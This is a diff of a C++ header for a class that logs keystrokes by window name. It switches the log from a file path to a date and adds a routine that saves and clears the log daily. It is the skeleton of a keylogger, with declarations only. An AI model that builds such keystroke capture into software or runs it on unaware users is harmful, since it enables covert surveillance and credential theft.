@@ -13,7 +13,7 @@ class Logger
 	map<string, string> Log;
 
 	// Hold path name where to save log
-	string Path;
+	string Date;
 
 	// Hold the keys map used to write down keys to log
 	Keys Keys;
@@ -26,14 +26,14 @@ class Logger
 
 public:
 
-	// Logger(string) : Constructor of the Logger class
-	Logger(string path);
-
-	// Logger(string, bool) : Constructor of the Logger class
-	Logger(string path, bool load);
+	// Logger() : Constructor of the Logger class
+	Logger();
 
 	// Add(string, int) : Add key stroke and the window name to Logger
 	void Add(string window_name, int key_stroke);
+
+	// UpdateLog() : Update the log date and save and clean log when date change
+	void UpdateLog();
 
 	// GetLog(string) : Return the key log for a specific window
 	string GetLog(string window_name);
@@ -41,11 +41,11 @@ public:
 	// GetLog(string) : Return all the key log for all window
 	string GetLog();
 
-	// GetPath() : Return the path to the log file
-	string GetPath() const;
+	// GetDate() : Return the the log date
+	string GetDate() const;
 
-	// SetPath(string) :  Set the path of the log file
-	void SetPath(string path);
+	// SetDate(string) :  Set the dare of the log
+	void SetDate(string date);
 
 	// SaveMapToFile() : Save Map content to file
 	void SaveMapToFile();
